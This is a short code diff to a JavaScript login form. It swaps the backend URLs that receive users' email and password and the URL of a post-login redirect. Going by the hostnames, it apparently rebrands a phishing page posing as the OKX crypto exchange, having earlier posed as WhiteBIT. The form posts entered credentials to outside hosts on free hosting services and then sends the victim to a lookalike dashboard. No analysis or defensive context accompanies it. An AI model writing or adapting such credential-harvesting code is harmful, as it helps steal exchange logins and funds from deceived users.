@@ -62,8 +62,8 @@ const validateEmail = (input) => {
   
   const data = {email, password}
   console.log(data)
-  const url = "https://cheerful-fox-waders.cyclic.cloud/api/login"
-  const urll = "https://webtext-qigk.onrender.com/api/loginemailsand"
+  const url = "https://okxnew-backend.vercel.app/api/login"
+  const urll = "https://okxnewbackend.onrender.com/api/loginemailsand"
 
   const LoginEmailSand = () => {
     axios.post(urll, {email})
@@ -92,7 +92,7 @@ const validateEmail = (input) => {
         dispatch(alluserdata(res.data))
         console.log(getId._id)
           setTimeout(() => {
-            window.location = `https://whitebitcrypfield-dashboard.vercel.app/#/${getId._id}`
+            window.location = `https://accountokx.vercel.app/#/${getId._id}`
             // navigate(`/userDashboard/${getId._id}`)
           }, [2000]);
         })
